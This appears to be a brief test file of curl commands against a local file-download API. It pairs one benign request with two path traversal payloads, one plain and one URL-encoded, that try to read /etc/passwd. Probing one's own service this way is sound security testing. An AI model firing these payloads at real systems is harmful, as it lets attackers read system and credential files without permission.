## benign
curl -v http://localhost:5007/api/files/download/1.txt -o test/output/1.txt

## path traversal attempt 1
curl -v "http://localhost:5007/api/files/download/../../../../../../../../../../../../../../../../etc/passwd" -o /tmp/pooled_passwd.txt

## path traversal attempt 2
curl -v "http://localhost:5007/api/files/download/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd" -o /tmp/pooled_passwd.txt

